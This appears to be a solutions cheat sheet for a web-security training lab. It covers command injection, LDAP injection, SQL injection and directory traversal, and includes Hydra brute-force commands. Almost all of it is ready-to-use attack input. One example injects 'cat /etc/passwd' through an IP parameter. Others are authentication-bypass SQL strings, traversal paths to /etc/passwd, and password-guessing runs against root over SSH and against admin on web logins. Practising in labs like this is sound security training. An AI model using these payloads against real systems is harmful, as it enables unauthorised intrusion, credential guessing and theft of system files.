# Phase III: Vulnerbility discovery & Exploitation
## Command Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | 10.0.2.4+%26%26+cat+%2Fetc%2Fpasswd `10.0.2.4 && cat /etc/passwd`|
| example&nbsp;2 | 10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd `10.0.2.4(New Line)&& cat /etc/passwd`|
| example&nbsp;3 | curl -X GET http://10.0.2.4/commandexec/example3.php?ip=10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd |

## LDAP attacks
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | http://10.0.2.4/ldap/example1.php `remove all parameter` |
| example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |

## Hydra
### Secure Shell
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l root
	  ssl://10.0.4.5
	  -f -vVd 
	  -o result.txt
	  -e nsr

### Basic Authentication
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-get "/auth"
	  -f
### Form Authentication
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-post-form "/login:username=^USER^:password=^PASS^:submit=Login:F=Invalid username"
	  -f

## SQL Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | root'+OR+'1'='1, `root'OR+1=1+--` |
| example&nbsp;2 | root'%09OR'1'='1 |
| example&nbsp;3 | root'/**/OR/**/'1'='1 |
| example&nbsp;4 | 2+OR+1=1 |
| example&nbsp;5 | 2+OR+1=1#123 |
| example&nbsp;6 | 2+OR+1=1#123 |
| example&nbsp;7 | 2%0AOR+1=1# |
| example&nbsp;8 | name\`,IF((SELECT+0x61)=0x61%2Cid%2Cage)+%23 |
| example&nbsp;9 | IF((SELECT+0x61)=0x61%2Cid%2Cage), `IF((SELECT'a')='a',id,age)` |

## Directory Traversal
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | ../../../../../../../../../etc/passwd |
| example&nbsp;2 | /var/www/files/../../../../../../etc/passwd |
